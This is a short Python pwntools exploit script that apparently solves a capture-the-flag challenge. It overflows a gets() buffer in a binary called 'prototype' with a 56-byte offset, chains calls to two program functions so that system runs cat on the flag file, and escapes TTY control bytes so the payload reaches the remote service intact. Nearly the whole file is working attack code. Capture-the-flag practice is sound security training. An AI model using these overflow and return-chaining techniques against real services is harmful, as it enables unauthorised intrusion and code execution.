#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./prototype', checksec=False)
HOST = 'tcp.sillyctf.psuccso.org'
PORT = 31913

# Remote service is behind a TTY-like line discipline.
# Quote control chars with ^V (0x16) so bytes reach gets() unchanged.
SPECIAL = {
    0x03, 0x04, 0x08, 0x0a, 0x0d, 0x11, 0x13,
    0x15, 0x16, 0x17, 0x1a, 0x1c, 0x7f,
}


def tty_quote(data: bytes) -> bytes:
    out = bytearray()
    for b in data:
        if b in SPECIAL:
            out.append(0x16)
        out.append(b)
    return bytes(out)


def build_payload() -> bytes:
    # offset 56 to RIP
    # 2x prototype_write => debug_increment == 2
    # ret (stack align)
    # prototype_display increments to 3 then calls system('/bin/cat flag.txt')
    raw = b'A' * 56
    raw += p64(elf.symbols['prototype_write']) * 2
    raw += p64(0x401016)  # ret
    raw += p64(elf.symbols['prototype_display'])
    return tty_quote(raw)


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b'>&')
    io.sendline(build_payload())

    out = io.recvall(timeout=5)
    print(out.decode('latin-1', errors='ignore'))


if __name__ == '__main__':
    main()
